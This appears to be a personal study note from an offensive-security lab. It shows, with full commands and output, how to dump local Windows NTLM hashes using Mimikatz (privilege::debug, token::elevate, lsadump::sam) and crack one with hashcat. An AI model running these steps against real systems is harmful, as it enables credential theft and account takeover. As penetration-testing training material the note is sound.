
# Cracking NTLM Hashes
On [Windows](../../computers/windows/README.md) machines passwords are [hashed](../../computers/concepts/cryptography/hashing.md) and stored in the [Security Account Manager](../../computers/windows/SAM.md)(SAM). Before being stored, passwords are hashed using [NTLM](../../networking/protocols/NTLM.md). Unfortunately, NTLM hashes are pretty insecure and an 8 character password can be *cracked within 2 hours*.
## NTLM Security
NTLM was created to replace the original protocol called LM. LM used DES which is known to be a very week algorithm. Additionally, LM was *case insensitive* which decreased the [Keyspace](password-cracking.md#Keyspace) making it easier to crack. 

NTLM hashes are more secure because they are *case sensitive* and use the *MD4* hashing algorithm. However, *they are not salted* (salting is when random bits are added to the beginning of a password before its hashed). Salting a password prevents it from being [brute-forced](../../cybersecurity/TTPs/cracking/brute-force.md) using a [rainbow-table](../../cybersecurity/TTPs/exploitation/rainbow-table.md).
## Getting the Hash
The SAM database file is located at `C:\Windows\system32\config\sam` and its contents can't just be copy pasted because Windows keeps a *file system lock* on it. Instead, we can use [Mimikatz](https://github.com/gentilkiwi/mimikatz).
### Finding Users to Impersonate
Before we use mimikatz, lets do some recon and find a user to impersonate. We can use `Get-LocalUser` in [powershell](../../computers/windows/powershell.md) to see a list of all of the users on the system:
```powershell
PS C:\Users\offsec> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
nelly              True
offsec             True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
...
```
In the output, we see that there are two enabled users, `nelly` and `offsec`.
### Mimikatz
[mimikatz](../../cybersecurity/TTPs/actions-on-objective/tools/mimikatz.md) is a versatile Windows tool which can be used for password and hash attacks. One thing in particular it can do is extract password hashes *from the [LSASS](../../computers/windows/LSASS.md)* process's memory. LSASS, which runs with `SYSTEM` level privileges, caches NTLM hashes and other creds in its memory. We can use Mimikatz' *sekurlsa* module to extract them.

Because `lsass.exe` runs with `SYSTEM` level privileges, we need to run Mimikatz *as an Administrator* with the `SeDebugPrivilege` access right enabled. `SeDebugPrivilege` grants us the ability to *debug processes* we own as well as ones we don't own.
#### Starting Mimikatz
First, open powershell by running it as an administrator. Find the `mimikatz.exe` tool (usually you have to bring the executable onto the Windows system you've compromised) and run it with `.\mimikatz.exe`:
```powershell
PS C:\Windows\system32> cd C:\tools
PS C:\tools> ls
    Directory: C:\tools
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe

PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```
Once you start it, it will give you a little repl shell thing. Now you can run mimikatz commands.
#### Enabling Privileges
There are a few commands for extracting passwords/tokens/hashes, etc. but a lot of them require the `SeDebugPrivilege` access right and `SYSTEM` level privileges. We can use `privilege::debug` to gain those:
```powershell
mimikatz # privilege::debug
Privilege '20' OK
```
#### Token Elevation Module
Now that we have `SYSTEM` privileges, we can access the LSASS. Mimikatz will allow us to do that via it's *[Token Module](../../cybersecurity/TTPs/actions-on-objective/tools/mimikatz.md#Token%20Module)*. This module allows Mimikatz to interact with Windows *authentication tokens* in the LSASS. With this module, mimikatz can grab tokens and then impersonate them. If we use `token::elevate`, we can impersonate another process/ user by elevating our token to theirs:
```powershell
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```
Now we're impersonating `NT AUTHORITY\SYSTEM` built-in account.
#### Getting the Hash with `lsadump::sam`
Now we can dump tokens from the SAM and see if we can find a token for the `nelly` user we saw with `Get-LocalUser` before:
```powershell
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
...
```
## Cracking the Hash
Now that we have the NTLM hash for the `nelly` user, we can bring it to our cracking rig and crack it. First, we need to put it into a file with a `.hash` extension. Then we can use [hashcat](../../cybersecurity/TTPs/cracking/tools/hashcat.md) to crack it:
### Find the Right Hash Mode
Assuming the hash we gathered is a regular NTLM hash we can find the hash mode for it like so:
```bash
hashcat --help | grep -i "ntlm"   
                                                                            
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol
   1000 | NTLM                                                | Operating System
```
From the output, our hashmode is `1000`.
### Crack the Hash
Now we can run hashcat. For the wordlist we can use `rockyou.txt` and for the ruleset we can use `best64.rule`:
```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.5) starting
...
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Thu Jun  2 04:11:28 2022, (0 secs)
Time.Estimated...: Thu Jun  2 04:11:28 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
...
```
Hashcat has managed to crack the hash for the password `nicole1`. 

> [!Resources]
> - [Mimikatz Repo](https://github.com/gentilkiwi/mimikatz)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.